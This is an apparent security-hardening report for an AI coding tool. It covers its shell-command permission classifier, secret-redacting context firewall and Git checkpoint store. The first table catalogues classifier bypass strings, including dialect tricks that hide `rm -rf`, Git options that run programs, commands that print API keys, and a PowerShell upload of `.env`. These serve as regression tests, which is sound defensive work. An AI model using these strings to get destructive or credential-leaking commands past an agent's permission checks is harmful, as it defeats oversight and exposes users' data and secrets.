# Campaign SEC-LATENT — latent findings from the 2026-09-24 security review

Branch `sec/latent-hardening`, worktree `.worktrees/sec-latent`, from main `87d9316`. Scope: the
findings of the independent review of snapshot `1bce77f` that are **latent** — in code that is
not yet wired to a provider path — and that `docs/campaigns/ADVANCED.md` §14b makes gates for
that wiring: the permission classifier (before any host-approval or hook bridge, Z7-W4), the
Context Firewall (before Context Drop, handoff or missions send anything), and the Git checkpoint
store (before Z6a IPC wiring). Release blockers were fixed separately (`SEC-0.1.1.md`).

Every proof of concept from the review snapshot was ported into a real regression test and each
test was run against the unfixed code first (the permissions suites against an extracted copy of
`87d9316`; the context and git suites before their fixes) to show that it reproduces the attack.
No provider session was started and no AI quota was used; the owner's app data was not touched.

Commits: `fe34d52`, `aba7b10` (permissions) · `2601c42` (context) · `5aa7af7`, `e6fad86` (git) ·
this document and §14b in the docs commit that follows them.

## 1. Permission classifier (`crates/permissions`) — High, latent

The classifier accepted the union of bash, cmd.exe and PowerShell syntax in a single reading.
Where a real shell parses differently, a compound command classified as one read-only command in
every mode. Review probe (`zz_review_probe.rs`) rows and the further gaps, re-checked with a
counting harness over 88 bypass rows: **16/88 handled before, 88/88 after**
(dialect 5/24 → 24, abbreviations/Unicode 2/23 → 23, Git and read-only execution options
5/17 → 17, environment secrets 0/13 → 13, wildcards 4/11 → 11).

| Finding | Fix | Evidence |
| --- | --- | --- |
| **Dialect handling** (High): `echo ^; rm -rf x` (bash: `^` is literal), `echo 'a & rd /s /q x'` (cmd.exe: `'` is literal), `echo “it's” ; Remove-Item -Recurse x` (PowerShell: smart quotes), `$'\x72\x6d' -rf x` and `echo $'\'' ; rm -rf x #'` (ANSI-C strings, comments), `echo x #'⏎rm -rf x⏎echo '`, `@rd /s /q x`, `rd/s/q x`, `rd,/s,/q,x`, `ForEach-Object{Remove-Item $_}`, `@{e={…}}`, `& ‘Remove-Item’`, `{rm,-rf,x}` (brace expansion), `echo ${X:-$(rm -rf x)}`, `%X%` / `!X!` as the program | `command/dialects.rs`: separate tokenizers for **POSIX sh** (`'…'`, `"…"` with `\` escapes, `\` escapes anything, `$'…'` decoded, `#` comments, backticks, brace expansion, `${…}` nesting with command substitution), **cmd.exe** (`^` escapes outside quotes only; `'`, `` ` ``, `$`, `\` literal; `&`/`&&`/`||`/`|`/newline/parentheses; `,`/`;` delimit arguments; `@` dropped; command name ends at `/`; `/s/q` split; `%VAR%` makes the text opaque because cmd expands it before parsing; `!VAR!` marks an expansion) and **PowerShell** (smart quotes and en/em/figure dashes normalized; `` ` `` escapes, `''`/`""`; `;`/`|`/`&&`/`||`/newline; `&` call operator; `{…}`/`(…)` blocks split even when glued; `#` and `<#…#>` comments; here-strings; `--%` and `` `u{…} `` opaque). `script()` classifies the text under all three **and** the legacy union reading (twice when it contains `\`), adds every reading's scopes together and makes the command opaque if any reading can't be interpreted — the most authority-requiring interpretation wins. Prefix rules only see a command every reading agrees is the same simple command. Nested scripts found by several readings are classified once per folder; path resolutions are cached per classification | `tests/sec_latent_classifier.rs`: `compound_commands_split_by_any_dialect_are_seen` (20 rows), `expansions_that_hide_the_program_are_opaque` (7); `escapes.rs` obfuscation table (+2 rows); unit tests in `command/dialects.rs` (9). Before: the first row of each suite failed (`"echo ^; rm -rf src": expected Destructive in [TerminalReadOnly]`) |
| **Git read commands with execution options** | `--upload-pack`/`--receive-pack`/`--exec` (fetch, pull, ls-remote, clone `-u…`, archive, push), `grep -O…`/`--open-files-in-pager`, `--ext-diff`, `difftool -x`/`--extcmd`, `--tool`, `rebase -x…`, `send-email --*-cmd`, `filter-branch` filters, `help -w` → `terminal.execute` + opaque; `--output[=]FILE` (also abbreviated) is a write; any write into `.git/hooks` or `.git/config` is opaque; `git -c`/`--config-env`/`--exec-path` stay opaque. Other read-only tools: `man -P/-H/--pager/--html`, `bat --pager`, `sort --compress-program`, `fc` (bash history re-run), `watchman … trigger` opaque; `less -o`, `tree -o` writes | `git_read_commands_with_execution_options_are_not_read_only` (18 rows, every mode ≠ Allow), `read_only_programs_with_execution_or_output_options` (9). Before: `"git grep -O evil.exe foo" should be opaque: [GitRead]` (allowed in Plan) |
| **PowerShell Unicode dashes and smart quotes** | Normalized in the PowerShell reading; `is_recursive_flag`/`ps_param` also normalize dashes | `unicode_dashes_and_abbreviated_options_keep_their_meaning`. Before: `"Remove-Item –Recurse –Force src": expected Destructive in [FilesystemWrite]` (Auto allowed it) |
| **Abbreviated flags** | `long_option()` (GNU prefix of `--recursive`, `--force`, `--hard`, `--delete`, `--mirror`, `--prune`, `--chdir`, `--split-string`, `--post-file`, `--rsh` …) and `ps_param()` (PowerShell prefix and `-Name:value`: `-rec`, `-Recurse:$true`, `-Me Post`, `-InF`, `-Ur`, `-OutF`) on every check that **adds** authority; checks that remove authority (`--dry-run`, `--staged`) stay exact. `env --chdir=DIR` no longer swallows the program. Uploaded files (`curl -d @f`, `-F x=@f`, `-T f`, `wget --post-file`, `-InFile`) are containment- and credential-checked | same test (17 rows) + `abbreviated_powershell_web_parameters_upload_files` (7). Before: `rm --rec`, `rsync --del`, `git push --forc` allowed in Auto; `Invoke-WebRequest -Ur https://docs.rs -Me Post -InF .env` was `[NetworkDocs]` |
| **Commands printing environment secrets** | `credentials.access` (asks in every mode, Bypass included) for `env`, `printenv`, `set` and cmd.exe `set PREFIX`, `export -p`, `declare -p X`, `compgen -v`, BSD `ps e`, `Get-ChildItem env:` (+ aliases), `Get-Item env:X`, `Get-Variable`, `[Environment]::GetEnvironmentVariable`, `Win32_Environment`, `/proc/*/environ`, and any expansion of a secret-named variable (`KEY`, `TOKEN`, `SECRET`, `PASS`, `PWD`, `CRED`, `AUTH`, `SESSION`, `COOKIE`, `PRIVATE`, `API`, …) in every syntax: `$X`, `${X}`, `$env:X`, `${env:X}`, `%X%`, `!X!` | `printing_environment_secrets_is_a_sensitive_read` (24 rows, every mode ≠ Allow; `$HOME`, `%PATH%`, `$env:PATH`, `set -euo pipefail` stay clean). Before: `"echo %ANTHROPIC_API_KEY%": [TerminalReadOnly]` (allowed everywhere) |
| **Glob arguments dodging the credential-path check** | `paths::glob_may_match_credentials`: wildcard/credential-pattern intersection (case-insensitive, POSIX dot rule) against every credential name, extension and folder; plus a bounded listing (4 096 entries) of the pattern's folder with PowerShell/cmd.exe semantics (`*` matches dot files). Patterns made only of wildcards are judged by the listing alone; name-only listers (`ls`, `dir`, `Get-ChildItem`, `tree`, `stat` …) are exempt. Credential names extended (`.vault-token`, `.s3cfg`, `.boto`, `.dockercfg`, `.my.cnf`, `.terraformrc`, `credentials.tfrc.json`, `kubeconfig`, `auth.json`, `*_sk` keys, `*.p8`, `*.keychain-db`, `environ`, `gcloud`, `.oci`, `.terraform.d`) | `wildcard_arguments_that_can_name_credentials_need_approval` (12 rows + FS case `type *.md` next to `.env.md` + 4 clean), `bare_wildcards_are_judged_by_what_the_folder_holds`, `paths::tests::{wildcards_that_can_name_credentials, glob_match_follows_shell_rules}`. Before: `"cat .en?": expected CredentialsAccess in [FilesystemRead, TerminalReadOnly]` |

**Property suites** (`tests/properties.rs`): random commands 3 000 → **6 000** with 35 new
dialect atoms (smart quotes, dashes, `$'`, `%X%`, `!X!`, `<#`, `--%`, `{rm,-rf,src}`, `@{e={`,
abbreviations, Git execution options, credential globs) — invariants hold, no panics;
**`deny_wins_for_destructive_commands_in_any_dialect`** — 4 000 compositions of a prefix, a
separator a real shell honours (per shell) and a destructive command that shell runs, under a
Custom profile denying `destructive`: every one is **Deny** (before: failed on
`ls -la 'x & git push --forc origin main & echo '` — `[FilesystemRead, TerminalReadOnly]`);
**`random_dialect_soup_never_panics_and_is_deterministic`** — 5 000 random strings over every
dialect's metacharacters, classified twice, identical results. The existing
`mutated_dangerous_commands_stay_dangerous_or_opaque` still passes.

On `87d9316`, 9 of the 11 tests in `sec_latent_classifier.rs` fail (the other two —
`common_read_only_commands_are_unaffected` and `classification_cost_stays_small` — are guards
against over-classification and cost).

**Changed expectation.** `quoted_data_is_not_mistaken_for_commands` had `printf '%s' '&& git push'`
as harmless quoted data; cmd.exe doesn't treat `'` as a quote and runs `git push'`. The row now
uses double quotes (quotes in every shell), and the single-quoted form is in the obfuscation
table as a `git.push`.

**Cost.** `classification_cost_stays_small`: 0.80 ms per command debug / 0.93 ms release
(unchanged from `87d9316`: 0.82 ms debug — dominated by path canonicalization, now resolved once
per classification and shared by the five readings); a 16 KiB command 19 ms debug / 8 ms release
(3 ms before).

## 2. Context Firewall (`crates/context`)

| Finding | Fix | Evidence (fail before → pass after) |
| --- | --- | --- |
| **M4** file ranges scanned only within the slice; a range skipping the `BEGIN` line leaked the PEM body | `Firewall::evaluate_excerpt`: detection runs on the whole decoded file and matches are clipped to the range (keys, YAML blocks, any multi-line secret intersecting it) | `sec_latent_firewall::m4_range_without_pem_header_does_not_leak_key_body` (8/8 body lines leaked → 0 over five ranges), `m4_range_of_assignment_value_on_later_line_is_redacted` |
| **M5** 25 of 37 common formats undetected | `src/detectors.rs` layer over the shared catalogue: AWS console pairs, Slack/Discord/Teams webhooks, SSH2 and age private keys, base64-encoded PEM keys (`client-key-data`), short and suffixed names, XML, name/value pairs, call arguments, `curl -u`, `mysql -p`, `--password`, Dockerfile `ENV`, `Authorization` schemes, YAML block scalars, URL credentials with empty user or `/` | `sec_latent_detection::every_review_format_is_fully_redacted` (25/37 leaked → 0/37), `name_value_pairs_are_redacted` (2/3 → 0/3), `new_detectors_keep_common_text_clean` (16) and the 33 existing false-positive fixtures |
| **M6** partial redaction | Whole quoted values, whole tokens (prefixes/suffixes), multi-line blocks as one span; line count preserved | same matrix |
| **M7** dropped files skipped never-share names | Never-share and exclusion rules applied to every item's file name (drops, pastes, documents, images; Windows and POSIX forms) | `m7_dropped_documents_apply_never_share_names` |
| Hard links bypassed never-share names | Link count of the opened handle (`nlink` / `GetFileInformationByHandle` via `winapi-util`, fail closed): more than one name → overridable block with an explanation | `hard_links_are_not_shared_silently` |
| Combined diffs bypassed withholding | `diff --cc`/`--combined`/`diff -…`, `Index:`, `Binary files`, rename/copy headers, plain `---`/`+++` sections; withholding runs for every text item kind | `combined_and_mixed_diffs_withhold_never_share_sections` (4 shapes × 5 kinds), `diff::tests::splits_combined_and_mixed_diffs` |
| Quadratic entropy pass | Linear pass with sorted `data:` ranges and a cursor | `entropy_pass_is_linear_on_crafted_input`: crafted 8 MiB **~18 s → 74–78 ms** release (3.6 s debug) |
| Never-share list gaps | Backup/copy decorations; kubeconfigs, Docker `config.json`, `.git-credentials`, `.netrc`, `.pgpass`, `.my.cnf`, `auth.json`, `.yarnrc`, Maven/Terraform/hub/rclone/Databricks/sops, Azure/gcloud token caches, Firebase admin JSON, `accessKeys.csv`, keytabs, keyrings, browser and password-manager stores/exports | `never_share_name_gaps_are_closed` (57 blocked, 10 ordinary names allowed) |
| Read-time TOCTOU | Open-then-verify: read through the handle opened on the checked canonical path, then require the same canonical path **and** file identity (`same_file`); documented in `docs/CONTEXT.md` | covered by every package test |

Panics: `sec_latent_no_panic` (ported `secrev_panics` + new atoms: 40 000 inputs release / 15 000
debug, 300 random ranges). Details: `docs/campaigns/CTX.md` "SEC-LATENT hardening".

## 3. Git checkpoint store (`crates/git`)

| Finding | Fix | Evidence |
| --- | --- | --- |
| Store "inside workspace" guard skipped on first use (`canonicalize` of the missing store folder failed, so the guard didn't run and `create_dir_all` made the store inside the workspace) | `CheckpointStore::check_location` on every workspace entry point (`create`, `plan_restore`, `execute_restore`, `diff`, `export_branch`), before anything is created and again after the folder is made; location via `paths::resolve_nearest` (nearest existing ancestor canonicalized + lexical rest, also the purely lexical form); overlap refused in both directions, component-wise, case-insensitive on Windows | `tests/sec_latent_store.rs`: 6 of 7 failed before (first use, every entry point, `..`/missing parts, letter case, junction into the workspace, workspace inside store); 7/7 after, including the store-outside control. Review PoC `zz_review_store_inside.rs` reproduced before the fix |
| Consumers reading by handle | `WorkspaceRoot::open_verified` / `verify_opened`: open first, then establish where the opened handle is — Linux `/proc/self/fd`; Windows and other systems: canonical re-resolve (containment-checked) and the handle must be that very file (`same_file`: volume serial + file index / device + inode). No `unsafe`: the first version called `GetFinalPathNameByHandleW` through FFI, a second audited `unsafe` site; it was replaced by the identity check (`e6fad86`), which gives the same guarantee. `HandleRegistry::open(ws, handle)` for consumers; `snapshot::read_capped` (every checkpoint content read) uses it | `tests/sec_latent_open_verified.rs` (5): outside handle refused, directory link to outside refused, folder swapped for a junction after issue refused, directories refused, normal reads work — did not compile before (API missing) |

Perf (Z6a budgets, release, 20 000 files): no-change checkpoint **731 ms** (≤ 2 s), 1 000 changed
**3.67 s** (≤ 5 s), restore plan 582 ms. Details and the loaded-machine runs: `Z6a.md` §11.

## 4. Gates

| Gate | Result |
| --- | --- |
| `cargo fmt --all -- --check` | clean |
| `cargo clippy --workspace --all-targets -- -D warnings` | clean |
| `cargo test --workspace --no-fail-fast` | 870 passed, 0 failed, 4 ignored |
| `pnpm check` | passes (format, lint, typecheck, tests — protocol 56, ui 11, testing 24, website 160 + 4 skipped, desktop 206, api 119 — branding, capabilities, zero-cost, releases). Run with `KALCODE_API_TEST_PORT=9451`: on the default port 18433 one API test read another checkout's dev server (different signing key) |
| `cargo deny check` | advisories, bans, licenses, sources ok |
| CTX budgets (≤ 50 ms/MiB), release, re-measured 2026-09-25 | scan + redact **7.9 ms/MiB**; package build **17.7 ms/MiB** (32 files, 1.94 MiB); folder analysis 10k + 3k ignored median **55 ms**; crafted 8 MiB entropy input **74 ms** |
| Z6a budgets | above (§3) |

## 5. Deferred, with reasons

| Item | Reason | Mitigation today |
| --- | --- | --- |
| Recursive search (`grep -r`, `rg`, `findstr /s`) reads every file under its folder, `.env` included | Flagging every recursive search as a credential read would make ordinary code search ask in every mode; the fix belongs with ignore-aware read scoping in the hook bridge | Documented in `PERMISSIONS.md` §9; Claude Code sessions carry KalCode's `Read` deny rules for credential files (SEC-0.1.1 item 2) |
| Pipelines that feed names into a reader (`gci -Include *.pem \| gc`) | Each command is judged on its own arguments | Same |
| Multi-level wildcards (`src/*/config`) | Only the last folder is listed; deeper patterns are checked statically | Static check covers credential folder names and `**` |
| `%VAR%` in any cmd.exe reading makes the command opaque (asks once, in every mode) | Correct for cmd.exe (the value is parsed after expansion); the cost is an extra prompt for harmless `echo %PATH%` | Opaque actions can be approved once |
| Firewall detectors live in `kalcode-context`, not the shared redactor (`kalcode_core::redact`), so log redaction keeps the old coverage; the shared entropy pass is still quadratic | `crates/native-core` is being changed concurrently by another campaign | Log redaction runs with entropy off; follow-up: move `detectors.rs` into native-core |
| A hard-linked file's other names can't be listed | Needs `FindFirstFileNameW` FFI (`unsafe`, workspace denies it) | Every multi-linked file needs a per-item confirmation |
| Git store-only entry points (`delete_ref`, `collect_garbage`, `usage_bytes`, `prune_to_quota`, `remove_store`) are not location-guarded | They take a workspace id, not a root, and never touch workspace files | — |
| Submodule-filter PoC (`zz_review_submodule_filter.rs`) | Not reproduced on Git 2.54.0.windows.1 (not even the PoC's own control); fix approach recorded in `Z6a.md` §11 | Existing `-c filter.*` overrides for the superproject |
| Other review probe rows judged by policy, not this campaign (`sed w`, `awk system()`, `python -m http.server`, `git remote set-url`, `kill -9 1` allowed in Auto as `terminal.execute`; writes to `.vscode/`, `.claude/`, `package.json` allowed in Auto) | Auto allows running programs and writing workspace files by design; these are not read-only misclassifications | Plan and Approve ask or deny |
